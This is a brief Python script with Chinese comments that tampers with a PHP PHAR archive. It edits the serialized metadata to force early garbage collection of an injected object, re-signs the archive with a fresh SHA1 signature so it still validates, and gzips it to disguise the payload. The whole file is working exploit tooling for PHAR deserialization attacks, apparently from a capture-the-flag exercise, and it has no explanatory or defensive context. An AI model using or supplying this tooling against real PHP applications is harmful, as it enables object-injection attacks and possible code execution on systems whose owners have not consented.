import gzip
import hashlib


def resign(source="source.phar",target="target.phar"):
    phar=None
    with open(source,"rb") as f:
        phar=f.read()
    phar=phar.replace(b'i:1;O:4:"fake":0:{}',b'i:0;O:4:"fake":0:{}') #强制GC
    source=phar[:-28] #需要进行签名的数据
    GBMB=phar[-8:] #签名标志(通常都是sha1??)和GBMB标签
    signature=hashlib.sha1(source).digest() #sha1签名
    phar=source+signature+GBMB
    with open(target,"wb") as f:
        f.write(phar)


def convert(source="target.phar",target="a"):
    phar=None
    with open(source,"rb") as f:
        phar=f.read()
    with gzip.open(target,"wb") as f:
        f.write(phar)


resign()
convert()